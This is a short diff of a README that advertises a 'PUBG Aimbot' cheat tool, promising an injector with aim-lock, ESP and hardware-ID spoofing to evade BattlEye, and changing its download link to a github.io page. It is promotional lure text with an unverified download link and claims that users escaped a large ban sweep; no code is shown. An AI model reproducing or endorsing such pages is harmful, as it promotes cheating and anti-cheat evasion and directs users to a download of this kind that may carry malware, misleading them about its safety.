@@ -3,7 +3,7 @@
 Want to beam rivals before they ADS?
 Slide in with the **PUBG Aimbot**—a stealth injector packing surgical snap-locks, ESP intel, and a built-in HWID cloak that leaves BattlEye scratching its head. A recent dev sweep blocked over 210 k shady accounts, yet users running this loader stayed chill. 
 
-[![Get PUBG Aimbot](https://img.shields.io/badge/Get%20PUBG%20Aimbot-blueviolet)](https://fileoffload13.bitbucket.io)
+[![Get PUBG Aimbot](https://img.shields.io/badge/Get%20PUBG%20Aimbot-blueviolet)](https://PUBG-Aimbot-taq.github.io/.github)
 
 **Quick Links:** [Overview](#overview) • [Features](#feature-breakdown-%F0%9F%9B%A0%EF%B8%8F) • [Install](#instant-install-guide)
 
